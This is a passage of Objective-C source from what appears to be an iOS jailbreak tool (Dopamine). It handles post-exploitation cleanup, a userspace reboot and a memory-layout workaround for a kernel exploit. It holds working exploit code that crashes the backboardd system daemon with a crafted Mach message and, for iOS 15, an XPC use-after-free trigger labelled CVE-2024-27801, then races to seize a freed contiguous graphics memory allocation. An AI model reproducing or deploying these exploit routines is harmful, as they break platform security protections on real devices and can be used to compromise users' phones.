        [self cleanUpPostExploitation];
        return;
    }
    
    // Unsandbox iconservicesagent so that app icons can work
    exec_cmd_trusted(JBROOT_PATH("/usr/bin/killall"), "-9", "iconservicesagent", NULL);
    
    *errOut = [self finalizeBootstrapIfNeeded];
    if (*errOut) {
        [self cleanUpPostExploitation];
        return;
    }
    
    [[DOEnvironmentManager sharedManager] setIDownloadEnabled:idownloadEnabled needsUnsandbox:NO];
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Checking For Duplicate Apps") debug:NO];
    *errOut = [self ensureNoDuplicateApps];
    if (*errOut) {
        [self cleanUpPostExploitation];
        *showLogs = NO;
        return;
    }
    *errOut = [self cleanUpPostExploitation];


    //printf("Starting launch daemons...\n");
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/uicache"), "-a", NULL);
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/Library/LaunchDaemons"), NULL);
    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/basebin/LaunchDaemons"), NULL);
    // Note: This causes the app to freeze in some instances due to launchd only having physrw_pte, we might want to only do it when neccessary
    // It's only neccessary when we don't immediately userspace reboot
    
    printf("Done!\n");
}

- (void)finalize
{
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebooting Userspace") debug:NO];
    [[DOEnvironmentManager sharedManager] rebootUserspace];
}

- (IOSurfaceRef)allocatePurpleGfxMemWithSize:(size_t)size
{
    NSDictionary *surfaceProperties = @{
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
        @"IOSurfaceAllocSize" : @(size),
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)surfaceProperties);
}

- (BOOL)surfaceIsContiguous:(IOSurfaceRef)surface
{
    vm_address_t mem_addr = (vm_address_t)IOSurfaceGetBaseAddress(surface);
    vm_size_t mem_size = (vm_size_t)IOSurfaceGetAllocSize(surface);
    vm_region_submap_short_info_data_64_t info = {0};
    uint32_t count = VM_REGION_SUBMAP_SHORT_INFO_COUNT_64;
    natural_t depth = 9999999;
    
    kern_return_t kr = vm_region_recurse_64(mach_task_self(), &mem_addr, &mem_size, &depth, (vm_region_recurse_info_t)&info, &count);
    return (kr == 0 && info.share_mode == SM_EMPTY && info.object_id != 0);
}

- (BOOL)contiguousMappingWorks
{
    IOSurfaceRef surface = [self allocatePurpleGfxMemWithSize:0x8000];
    if (surface == NULL) return false;
    
    BOOL contiguous = [self surfaceIsContiguous:surface];
    CFRelease(surface);
    return contiguous;
}

- (BOOL)contiguousMappingWorkaroundNeeded
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    if ([kernelExploit hasRequirement:@"contiguousMapping"]) {
        return ![self contiguousMappingWorks];
    }
    return NO;
}

- (int)crashBackboardd
{
#pragma pack(push, 4)
    typedef struct {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t archive;
        NDR_record_t ndr;
        mach_msg_type_number_t archiveLength;
    } Request;
#pragma pack(pop)
    
    kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);
    
    NSData *archive =
        [NSKeyedArchiver archivedDataWithRootObject:@[ @[] ]
                              requiringSecureCoding:YES
                                              error:nil];
    mach_port_t bootstrap = MACH_PORT_NULL;
    mach_port_t service = MACH_PORT_NULL;

    if (!archive ||
        task_get_bootstrap_port(mach_task_self(), &bootstrap) != KERN_SUCCESS ||
        bootstrap_look_up(bootstrap, "com.apple.backboard.hid.services", &service) != KERN_SUCCESS) {
        return -1;
    }

    Request request = {0};
    request.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    request.header.msgh_size = sizeof(request);
    request.header.msgh_remote_port = service;
    request.header.msgh_id = 6000032;   // kPostTouchAnnotationsMessageID
    request.body.msgh_descriptor_count = 1;
    request.archive.address = (void *)archive.bytes;
    request.archive.size = (mach_msg_size_t)archive.length;
    request.archive.copy = MACH_MSG_VIRTUAL_COPY;
    request.archive.type = MACH_MSG_OOL_DESCRIPTOR;
    request.ndr = NDR_record;
    request.archiveLength = (mach_msg_type_number_t)archive.length;

    (void)mach_msg(&request.header,
                   MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                   request.header.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   1000,
                   MACH_PORT_NULL);
    
    mach_port_deallocate(mach_task_self(), service);
    return 0;
}

- (int)crashBackboardd_15
{
    // CVE-2024-27801
    xpc_connection_t (*haxx_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
    if (!haxx_xpc_connection_create_mach_service) {
        return -1;
    }
    xpc_connection_t client = haxx_xpc_connection_create_mach_service("com.apple.backboard.TouchDeliveryPolicyServer", NULL, 0);
    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {});
    xpc_connection_resume(client);
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    uint8_t root[1024] = { 0 };
    memcpy(root, "bplist17", strlen("bplist17"));
    xpc_dictionary_set_data(message, "root",root, 1024);
    xpc_dictionary_set_uint64(message, "proxynum", 1);
    xpc_dictionary_set_uint64(message, "inv", 1);
    uint8_t uaf_xpc[1024];
    memset(uaf_xpc, 0x41, 1024);
    xpc_dictionary_set_value(message, "ool", xpc_data_create(uaf_xpc, 1024));
    xpc_connection_send_message_with_reply_sync(client, message);
    return 0;
}

- (void)applyContiguousMappingWorkaround
{
    if (@available(iOS 16.0, *)) {
        [self crashBackboardd];
    }
    else {
        [self crashBackboardd_15];
    }
    // After backboardd has crashed, we have about 200ms until the new backboardd kills our app
    // In this timeframe we need to steal it's contiguous PurpleGfxMem allocation
    IOSurfaceRef surface = NULL;
    do {
        if (surface) {
            CFRelease(surface);
            surface = NULL;
            usleep(50);
        }
        surface = [self allocatePurpleGfxMemWithSize:0x8000];
    }
    while (![self surfaceIsContiguous:surface]);
    
    printf("Got contiguous mapping surface %p\n", surface);
    
    // We keep the surface alive for another 20 seconds
    // This persists our process being killed
    // Once it is freed, the next Dopamine can regain the contiguous mapping
    mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
    kern_return_t kr = clock_alarm_preserve_port(surfacePort, 20);
    mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
    CFRelease(surface);
    
    printf("preserved port? %d\n", kr);
}

@end
